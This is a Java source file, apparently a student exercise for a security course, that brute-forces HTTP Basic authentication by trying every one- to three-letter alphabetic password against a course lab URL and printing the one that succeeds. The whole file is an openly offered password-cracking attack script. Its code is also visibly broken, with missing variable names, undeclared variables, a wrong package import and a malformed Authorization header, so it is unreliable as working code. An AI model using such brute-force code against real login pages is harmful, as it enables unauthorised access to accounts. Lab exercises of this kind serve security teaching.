

import java.io.*;
import java.net.*;
import java.misc.BASE64Encoder;

public class BruteForce
{
  public BruteForce()
  {}

  public boolean fetchURL(String urlString,String username,String password)
  {
     StringWriter  = new StringWriter();
     PrintWriter  pw = new PrintWriter();
     try{
       URL url=new URL(urlString);  
       String userPwd= username+":"+password;

       
       
       
       

       BASE64Encoder encoder = new BASE64Encoder();
       String encodedStr = encoder.encode (userPwd.getBytes());
       System.out.println("Original String = " + userPwd);
	 System.out.println("Encoded String = " + encodedStr);

       HttpURLConnection huc=(HttpURLConnection) url.openConnection();  
       huc.setRequestProperty( "Authorization"," "+encodedStr);   
       InputStream content = (InputStream)huc.getInputStream();
       BufferedReader in   = 
       new BufferedReader (new InputStreamReader (content));
       String line;
       while ((line = in.readLine()) != null) {
         pw.println (line);
       System.out.println("*************************************************");
       System.out.println(sw.toString());
       }return true;
     } catch (MalformedURLException e) {
       pw.println ("Invalid URL");
       return false;
     } catch (IOException e) {
       pw.println ("Error  URL");
       return false;
     }

  }

  public void getPassword()
  {  
     String alps="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
     String urlString="http://sec-crack.cs.rmit.edu./SEC/2/";
     String login="";
     String pwd=" ";

      startTime=System.currentTimeMillis();
     for(int oneChar=0;oneChar<alps.length();oneChar++)
     {
        pwd=alps.substring(oneChar,oneChar+1);
        if(this.fetchURL(urlString,login,pwd))
        {
            finishTime=System.currentTimeMillis();
           System.out.println("Finally I gotta it,  password is : "+pwd);
           System.out.println("The time for cracking password is: "+(finishTime-startTime) + " milliseconds");
           System.exit(1);
        } 
        for(int twoChar=0;twoChar<alps.length();twoChar++)
        {
           pwd=alps.substring(oneChar,oneChar+1)+alps.substring(twoChar,twoChar+1);
           if(this.fetchURL(urlString,login,pwd))
           {
              finishTime=System.currentTimeMillis();
             System.out.println("Finally I gotta it,  password is : "+pwd);
             System.out.println("The time for cracking password is: "+(finishTime-startTime) + " milliseconds");
             System.exit(1);
           }
           for(int threeChar=0;threeChar<alps.length();threeChar++)
           {
             pwd=alps.substring(oneChar,oneChar+1)+alps.substring(twoChar,twoChar+1)+alps.substring(threeChar,threeChar+1);
             if(this.fetchURL(urlString,login,pwd))
             {
                finishTime=System.currentTimeMillis();
               System.out.println("Finally I gotta it,  password is : "+pwd);
               System.out.println("The time for cracking password is: "+(finishTime-startTime)+ " milliseconds");
               System.exit(1);
             }
           }
        }
     }
   }

  public static void main(String[] arguments)
  {
     BruteForce bf=new BruteForce();
     bf.getPassword();
  } 
}